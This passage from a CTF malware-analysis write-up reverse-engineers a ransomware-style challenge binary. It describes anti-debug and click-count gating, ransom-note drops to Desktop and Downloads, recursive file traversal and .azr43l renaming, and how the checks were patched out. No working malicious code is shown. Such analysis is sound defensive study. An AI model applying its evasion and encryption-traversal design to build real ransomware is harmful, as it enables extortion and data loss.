+6 and 5 respectively.</p>
+<p>This clears out the doubt on why the malware wouldn&rsquo;t run under normal circumstances making it difficult for sandboxing and dynamic analysis, as it requires a specific set of actions to be done in a certain number for it to proceed executing the main malicious code.</p>
+<p>After that we notice some basic initialization type code until line 179 (below)</p>
+<p>And tracking that particular offset 140002CFF0 leads us to functions which looks like a heapfree and memory allocation, all of this sounds like basic initialization. So not much use for us to actually reverse this part of the code</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-30.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="sub_140023030-aka-unkn_func_1">sub_140023030() AKA Unkn_Func_1<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_140023030-aka-unkn_func_1"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-31.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>has been rechanged to</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-32.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>going into the function it seems too much to reverse statically, so we will come back to this later and look at it dynamically</p>
+<h4 class="group head-tag" id="sub_14000c1b0-aka-get-environment-variable">sub_14000C1B0() AKA Get Environment Variable<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_14000c1b0-aka-get-environment-variable"></a></h4><p>Next interesting function is</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-33.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>This function seems to take an arguemnt as &ldquo;USERNAME &quot; and a hObject to output the value</p>
+<p>Going inside the function we see it does make use of the USERNAME argument in calling the windows API</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-34.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>So we got the understanding that the hObject that goes out of this is the ENV VARIABLE</p>
+<h4 class="group head-tag" id="filepath-setting">filepath setting<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#filepath-setting"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-36.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>this block of code seems like it is reading an existing string(unk_14002D040)</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-37.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>at particular offsets and it is appending whatever is read from env_struct to
+parts of this string</p>
+<p>A hunch we can easily form out of this entire code block is that it is using our system USERNAME to get the correct full path of these directories</p>
+<ul>
+<li>C:\Users%USER%\Downloads\</li>
+<li>C:\Users%USER%\Desktop\</li>
+</ul>
+<p><code>sub_140011F80</code> mentioned here seems to be taking these</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-38.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Going inside it, we see it basically has a memcpy inside it</p>
+<p>so we aptly can rename sub_140011F80 -&gt;concat</p>
+<p>Also, we see the output in one is being used in the other after being put through another function sub 140018D50, which just returns the string as is, this can be hunched of as <code>unrwap()</code> in rust</p>
+<p><code>sub_140005700</code> just calls a freeheap within itself, so we can rename that as <code>freeheap</code> as well</p>
+<p>so now the cleaned up statically analysed block of code looks like</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-39.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>And going by the order of the string, I would assume that it is being put to use in the same order that it is stored in</p>
+<ul>
+<li>C:\Users%USER%\Downloads\</li>
+<li>C:\Users%USER%\Desktop\</li>
+</ul>
+<p>So we can rename the above image to kind of fit our mental image of what is happening</p>
+<h4 class="group head-tag" id="ransom_note_file_name">Ransom_note_file_name<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#ransom_note_file_name"></a></h4><p>As we can see, first 17 bytes of this offset is read in</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-40.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-41.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="create-random-file">Create Random File<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#create-random-file"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-42.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>when went into the highlighted function, we see calls such as</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-43.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>which leads us to understand that this now creates a file under the name
+<code>Azr43l_README.txt</code>.</p>
+<p>And we see this being used to the very last concatenated file_path, which under our assumption is <code>Desktop</code>.</p>
+<h4 class="group head-tag" id="write-ransom-note-to-desktop">Write ransom note to desktop<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#write-ransom-note-to-desktop"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-45.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>In the above image we see <code>sub_140004550</code>, we see calls to NtWriteFile</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-46.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and this function by itself takes arguments to the ransom_note
+hence it is safe to assume that it does write the ransom_note onto the newly created <code>Azr43l_README.txt</code></p>
+<p>Then after this block of code it&rsquo;s mostly a bunch of heap_free calls until line 252</p>
+<p>let&rsquo;s check this in our chall file</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-44.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>as well we can find a fake flag in flag.txt</p>
+<pre tabindex="0"><code>bi0sctf{obviously_the_realest_flag_of_2024}
+this is not a fake flag, if it is , you can spam the report on the chall author
+thank you
+happy investigating :)
+</code></pre><p>but thank you all for not reporting me :P</p>
+<h4 class="group head-tag" id="sub_140017ef0-aka-unkn_func_2">sub_140017EF0() AKA unkn_func_2<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_140017ef0-aka-unkn_func_2"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-47.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We see the same routine yet again and some file_path\Azr43l_README.txt being passed as an arg to the above mentioned func. We don&rsquo;t understand much from looking into this, this is yet another function to be looked at dynamically.</p>
+<h4 class="group head-tag" id="ransom-note-drop-pt2">Ransom note drop pt.2<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#ransom-note-drop-pt2"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-48.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Starting from line 275 we see a similar routine again of it again wrting the same content to this new file, it&rsquo;s just that it is in a different location (which can be found out dynamically).</p>
+<h4 class="group head-tag" id="sub_140001450-aka-unkn_func_3">sub_140001450 AKA Unkn_Func_3<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_140001450-aka-unkn_func_3"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-49.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now we get to what seems to be the crux of the ransomware.
+We see a new function which we have named unkn_func_2 take in the earlier unkn_func_1&rsquo;s output and it also takes the user_download_folder path, going into the function, it only confuses us even more, so for now we stick to just renaming it like so</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-50.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>As I continued to scroll down more, I saw a similar routine of unwrapping a string and unkn_func_3 being called on them at which point I thought, static analysis is gonna get us only so far, and that we can start looking at the file dynamically.</p>
+<h3 class="group head-tag" id="one-step-ahead">One step Ahead<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#one-step-ahead"></a></h3><p>Before we start with the dynamic analysis of the ransomware, it would be helpful to debug and get to code faster if we patch out these three key areas</p>
+<ul>
+<li>The anti debug check as mentioned above</li>
+<li>The cmp for the number of clicks both 5 and 6</li>
+</ul>
+<p>I decided to run this binary now, in a controlled environment ofcourse to see what this does, and as expected so far, we see a ransom note in Desktop and we also see certain files getting encrypted and being renamed as .azr43l files</p>
+<p>for example</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-52.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h3 class="group head-tag" id="dynamic-analysis">Dynamic Analysis<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#dynamic-analysis"></a></h3><p>NOTE:</p>
+<pre tabindex="0"><code>All the debugging that is being shown in this writeup has been purely done inside and isolted VM. And under no condition, should you try to replicate it on the HOST.
+</code></pre><p>Now we can start with the dynamic analysis of the ransomware</p>
+<p>Becuase we patched out the above mentioned areas of jnb to respect jb and jz to jnz, debugging is a smooth sail</p>
+<p>we get to the first function we wanted to look at dynamically</p>
+<h4 class="group head-tag" id="sub_140023030-aka-unkn_func_1-aka-random_24_gen">sub_140023030() AKA Unkn_Func_1 AKA random_24_gen<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_140023030-aka-unkn_func_1-aka-random_24_gen"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-53.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Initially we just kept track of the output value of this function
+and func_1_output seems to be generated on runtime</p>
+<p>and when tried to run multiple times, we see different values being generated</p>
+<p>&lt;1&gt;
+
+  <img
+    class="data-image"
+    src="./image-54.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<p>&lt;2&gt;
+
+  <img
+    class="data-image"
+    src="./image-55.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<p>&lt;3&gt;
+
+  <img
+    class="data-image"
+    src="./image-56.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<p>Looking at this we see, it generates</p>
+<ul>
+<li>Random value</li>
+<li>24 bytes</li>
+</ul>
+<p>so we can go ahead and change the name of the func to</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-57.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="get_env_variable">Get_env_Variable<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#get_env_variable"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-58.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Can confirm that it does take the given struct adn does return the %USER% value in the struct</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-59.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="setting-filepath">Setting Filepath<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#setting-filepath"></a></h4><p>we can confirm those particular file_paths now and we do see the actual path and we can name the variables accordingly</p>
+<p>&lt;1&gt;
+
+  <img
+    class="data-image"
+    src="./image-60.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<p>&lt;2&gt;
+
+  <img
+    class="data-image"
+    src="./image-61.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<p>&lt;3&gt;
+
+  <img
+    class="data-image"
+    src="./image-62.png"
+    alt="alt text"
+    loading="lazy" />
+
+</p>
+<h4 class="group head-tag" id="ransom_note_path">Ransom_note_path<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#ransom_note_path"></a></h4><p>The ransom note path can also be found as shown below
+<code>C:\Users\Ryuzaki\Desktop\Azr43l_README.txt</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-63.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="unkn_func_2">Unkn_func_2<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#unkn_func_2"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-64.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now we come to unkn_func_2</p>
+<p>We see the first arg being some structure, and the second one being the desktop_ransom_note file path</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-65.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>We see plii return 1 at the cb.size so it doesn&rsquo;t even enter the block of code under the if condition below</p>
+<h4 class="group head-tag" id="unkn_func_3">Unkn_func_3<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#unkn_func_3"></a></h4><p>Now we come to this part of the code</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-66.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>as we can see, from renaming the above variables in the &ldquo;setting filepath&rdquo; we get an idea as to what all args are being passed into this function
+namely</p>
+<ul>
+<li>file_directory_path (download folder in this case)</li>
+<li>file_directory_path_len (confirm from debugging)</li>
+<li>random_generated_val (24 bytes)</li>
+</ul>
+<p>Statically looking at unkn_func_3 we see a lot of operations pertaining to an encryption of sorts and we see some variables named randombuffer , we see this string
+<code>98238588864125956469313398338937</code> being xorred with something</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-67.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and we also see the use of the string .azr43l, as seen above in the second behavioural analysis attempt</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-68.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>So going based off of these hunches, now I name the current function that we are in right now, unkn_func_3 as encrypt()</p>
+<h4 class="group head-tag" id="encrypt---the-heart-of-the-ransomware">Encrypt() - the heart of the ransomware<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#encrypt---the-heart-of-the-ransomware"></a></h4><p>Going into encrypt, we come across the first function which takes the file_path and the file_length as arguments, v53 being the output</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-69.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Currently in our case, the file_path is the download folder and the file_length is accordingly set.</p>
+<h4 class="group head-tag" id="sub_140016d10">sub_140016D10<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_140016d10"></a></h4><p>Going inside the above mentioned function, we see</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-70.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<pre tabindex="0"><code>I have renamed some variables as differently variants of &#34;file_path&#34; accordingly again and again ,because the pointers were being copied and switched around
+</code></pre><p>As we keep scrolling down, most of it seem pretty basic and normal assigning operations with nothing much being operated upon.
+Until this part,</p>
+<p>path file before that particular function call was just our downloadpath file
+C:\Users%USER%\Downloads\</p>
+<p>But after that call,</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-71.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-72.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>it is appended with a * like so</p>
+<p>And in windows * is reserved and is not allowed to be used as an actual file name.</p>
+<p>It is mostly used to search under a particular directory, a regex the means anything matching that particular pattern of string. So rn it seems as if that function was supposed to append a * depending on whether or not the pathfile ended in a &quot;&rdquo; character.</p>
+<p>so we rename that function sub_7FF792300B20 like so</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-73.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and continue ahead.</p>
+<h4 class="group head-tag" id="sub_14001a640-aka-convert_to_widechar">sub_14001A640 AKA convert_to_widechar<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_14001a640-aka-convert_to_widechar"></a></h4><p>takes our file_path as arg</p>
+<p>and once it exits, we see this</p>
+<p>when we track our filepath variable</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-74.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-75.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>hence it has been aptly named</p>
+<h4 class="group head-tag" id="sub_1400194e0-aka-get_full_path_name">sub_1400194E0 AKA get_full_path_name<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_1400194e0-aka-get_full_path_name"></a></h4><p>it takes lpfilename and our file_path as argument, and output&rsquo;s the fullpath name under lpfilename</p>
+<p>When we look inside the function we see</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-76.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and stepping over this function while debugging also confirms the same. In our case it returns the same C:\Users\Ryuzaki\Downloads*</p>
+<p>Now coming to next block of code</p>
+<h4 class="group head-tag" id="findfirstfilew">FindFirstFileW<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#findfirstfilew"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-77.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-78.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>it returns a handle to the file and an output value under the second arguemnt containing information about the file under the structure of FIND_DATAW</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_WIN32_FIND_DATAA</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">dwFileAttributes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILETIME</span> <span class="n">ftCreationTime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILETIME</span> <span class="n">ftLastAccessTime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">FILETIME</span> <span class="n">ftLastWriteTime</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">nFileSizeHigh</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">nFileSizeLow</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">dwReserved0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">dwReserved1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">CHAR</span>     <span class="n">cFileName</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">CHAR</span>     <span class="n">cAlternateFileName</span><span class="p">[</span><span class="mi">14</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">DWORD</span>    <span class="n">dwFileType</span><span class="p">;</span> <span class="c1">// Obsolete. Do not use.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">DWORD</span>    <span class="n">dwCreatorType</span><span class="p">;</span> <span class="c1">// Obsolete. Do not use
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">WORD</span>     <span class="n">wFinderFlags</span><span class="p">;</span> <span class="c1">// Obsolete. Do not use
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">WIN32_FIND_DATAA</span><span class="p">,</span> <span class="o">*</span><span class="n">PWIN32_FIND_DATAA</span><span class="p">,</span> <span class="o">*</span><span class="n">LPWIN32_FIND_DATAA</span><span class="p">;</span>
+</span></span></code></pre></div><p>The key point to note is this structure contains the filename of the file that it has an info on, so our program is trying to leverage this method of finding every filename inside a given directory</p>
+<p>So now we can rename the args to more understandable names</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-79.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Next as we keep executing,</p>
+<p>we see our file_info being copied into the a1 ie our arg1 which we initially thought wld be the output of this particular function as well</p>
+<p>And then it returns</p>
+<p>so to summarize,</p>
+<p>basically this function takes a particular argument, checks if it is a directory, if it is , it would add the &quot; * &quot; operator at the end of the directory and calls FindFirstFileW and gets the file info based on that particular file and returns that in a struct</p>
+<p>So we name it as as get_file_data</p>
+<h4 class="group head-tag" id="suspicious-xmmword">Suspicious xmmword<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#suspicious-xmmword"></a></h4><p>Just looking at the assembly side by side</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-80.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we see a bunch of bytes getting copied over into xmm6 and xmm7 , we just keep that in mind and go ahead</p>
+<h4 class="group head-tag" id="sub_7ff7922fc850">sub_7FF7922FC850<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_7ff7922fc850"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-81.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Not used.</p>
+<h4 class="group head-tag" id="next">Next<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#next"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-82.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>While debugging we see the memcpy 2&rsquo;s first argument is populated with the filename from get_file_data pointer</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-83.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now in my case it turned out to be another directory that is stored first</p>
+<p>continuing,</p>
+<p>we see now the if condition fails at <code>sub_7FF792302070</code>
+and goes onto the else condition only to call encrypt function again recrusively</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-84.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<h4 class="group head-tag" id="recursive-encrypt---iteration-1">Recursive encrypt - iteration 1<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#recursive-encrypt---iteration-1"></a></h4><p>Now are are recrusively inside the encrypt function with the argument as
+<code>C:\Users\Ryuzaki\Downloads\DebugView</code></p>
+<p>we go through the same steps of finding the first file handle and it&rsquo;s details and names</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-85.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>For the purpose of creating this writeup I had made a dummy file under downloads directory and filled it with loerm ipsum content, and now that this file is taken in it passes throuhgh the above function wih no issues, I can form the hunch that the above function</p>
+<p><code>sub_7FF792302070</code> is to check if a particular path is a directory or not</p>
+<p>we&rsquo;ll go ahead with that.</p>
+<h4 class="group head-tag" id="sub_7ff7922fc6f0">sub_7FF7922FC6F0()<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#sub_7ff7922fc6f0"></a></h4>
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-86.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>passing through this function and looking at the value inside <code>RandomBuffer</code>, show&rsquo;s us</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-87.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p><code>txt</code> - meaning the function serves it&rsquo;s purpose to find the extension of the loaded file.</p>
+<p>then this extension is compared against <code>azr43l</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-88.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>if the extension is already <code>azr43</code>l then it enters the else condition and looks for more files in the same directory</p>
+<p>and if the extension is not the same then it enters into the if condition</p>
+<p>This throws more light on the ransomware, that once it encrypts it&rsquo;s files it would extend it with <code>azr43l</code></p>
+<p>In the next check it makes sure it doesn&rsquo;t encrypt the ransom_note.txt</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-89.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>if it turns out to be the ransom note then it exits ,looking for the next file in the directory</p>
+<p>next we see inside this unkn_func_0</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-90.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we spot it&rsquo;s a CreateFile API</p>
+<p>hence we name this function as create_file</p>
+<p>then as we go down, we debug more to spot a particular function</p>
+<p><code>sub_7FF792301E20</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-91.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>That seems to return the filename alone from the huge file path, for example in our case it is - <code>just_a_test_doc</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-92.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Then from further debugging we see function calls such as</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-93.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>which I have renamed it, because it returns the technical last byte being &ldquo;\0&rdquo;</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-94.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Then it takes the file_name and appends to it the .azr43l extention through these two memcpy</p>
+<p>Next during further debuggin we notice and rename a particular function call that just returns the current directory path that the file is in</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-95.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-96.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>and that it is getting copied to Random buffer</p>
+<p>Next in the subsequent lines of code</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-97.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we see random buffer being appended to file_directory
+there_by creating this</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-98.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>basically it appends .azr43l to the path of the old filename and it creates a new file_path</p>
+<h4 class="group head-tag" id="creating-encrypted-file">Creating Encrypted File<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#creating-encrypted-file"></a></h4><p>Now we notice it creates a new handle and opens it to the new encrypted file under the new name of</p>
+<p><code>C:\Users\Ryuzaki\Downloads\DebugView\just_a_test_doc.txt.azr43l</code></p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-100.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Then it&rsquo;s just doing a few copies of file pointers which is not really necessary for us at the moment</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="./image-101.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>it provies a malloc space for file_contents then we finally come to reading the file</p>
